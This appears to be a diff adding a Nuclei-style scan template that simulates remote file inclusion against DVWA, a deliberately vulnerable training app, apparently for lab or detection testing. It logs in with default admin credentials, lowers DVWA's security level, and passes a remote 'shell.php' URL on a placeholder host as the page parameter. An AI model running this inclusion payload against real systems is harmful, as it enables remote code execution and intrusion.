@@ -1,0 +1,68 @@
+id: web-remote-file-inclusion-simulated
+
+info:
+  name: Web Remote File Inclusion Enumaration Simulated
+  author: Shieldia
+  severity: info
+  description: Simulates Remote File Inclustion
+  tags: web
+
+variables:
+  password: "password"
+  username: "admin"
+  remote_servers:
+    - "http://example.home.arpa/shell.php"
+    - "example.home.arpa"
+    - "127.0.0.1"
+
+flow: |
+  http(1) && http(2)
+  for (let remote_server of iterate(template["remote_servers"])) {
+    set("remote_server", remote_server);
+    http(3);
+  }
+
+http:
+  # Step 1: Authenticate as admin and get PHPSESSID and user_token
+  - raw:
+      - |
+        GET /DVWA/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Connection: close
+
+      - |
+        POST /DVWA/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: */*
+        Connection: close
+
+        username={{username}}&password={{password}}&Login=Login&user_token={{token}}
+    
+    extractors:
+      - type: regex
+        name: token
+        group: 1
+        part: body
+        regex:
+          - "name='user_token' value='([a-f0-9]+)'"
+        internal: true
+
+  # Step 2: Set Security Level to Low
+  - raw:
+      - |
+        POST /DVWA/security.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: */*
+        Connection: close
+
+        security=low&seclev_submit=Submit&user_token={{token}}
+
+  - raw:
+      - |
+        GET /DVWA/vulnerabilities/fi/?page={{remote_server}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Connection: close
